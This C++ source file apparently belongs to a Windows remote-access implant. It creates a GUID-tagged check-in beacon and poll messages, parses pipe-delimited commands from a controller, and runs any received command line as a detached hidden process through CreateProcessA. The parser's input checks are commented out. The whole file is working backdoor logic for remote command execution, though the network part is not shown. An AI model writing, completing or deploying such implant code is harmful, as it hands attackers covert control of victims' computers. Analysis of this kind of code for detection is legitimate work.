#include "Command.h"
#include "StringOperations.h"

#include <objbase.h>
#include <stdio.h>
#include <string>


#define MAX_LEN 128
using namespace std;

void GetInitialCommand(char** str, char** szuuid)
{

	GUID guid;
	*szuuid = (char*)malloc(MAX_LEN);
	*str = (char*)malloc(256);

	CoCreateGuid(&guid);

	snprintf(
		*szuuid,
		MAX_LEN,
		"%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X",
		guid.Data1, guid.Data2, guid.Data3,
		guid.Data4[0], guid.Data4[1],
		guid.Data4[2], guid.Data4[3],
		guid.Data4[4], guid.Data4[5],
		guid.Data4[6], guid.Data4[7]);


	//initial command: i|{windows version}|{guid}
	snprintf(
		*str,
		256,
		"i|%s|%s",
		"W10",
		*szuuid);
}

void GetPollCommand(char** str, char* szuuid)
{
	*str = (char*)malloc(256);
	snprintf(
		*str,
		256,
		"p|%s",
		szuuid);
}

void ParseCommand(char* str, int* commandType, char** commandData, bool* continuePolling)
{
	int numResults;
	char** splitResult = SplitString(str, (char*)"|", &numResults, false);

	/*if (numResults != 4) {
		*continuePolling = false;
		commandData = 0;
		*commandType = -1;
	}*/

	*continuePolling = (strncmp(splitResult[0], "y", 1) == 0) ? true : false;

	*commandType = std::stoi(splitResult[1], 0, 10);

	int commandSize = std::stoi(splitResult[2], 0, 10);
	*commandData = (char*)malloc(commandSize);
	ZeroMemory(*commandData, commandSize);
	memcpy_s(*commandData, commandSize, splitResult[3], commandSize);

	FreeSplitStringBuffer(splitResult, numResults);

}

void CommandExecute(int commandType, char* commandData)
{
	if (commandType == 0){
		STARTUPINFOA si;
		PROCESS_INFORMATION pi;

		char explorerPath[260];
		GetSystemDirectoryA(explorerPath, 260);

		ZeroMemory(&si, sizeof(si));
		ZeroMemory(&pi, sizeof(pi));

		si.cb = sizeof(STARTUPINFOA);
		
		if (!CreateProcessA(NULL, commandData, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi)) 
			OutputDebugString(L"error");
	
	}
}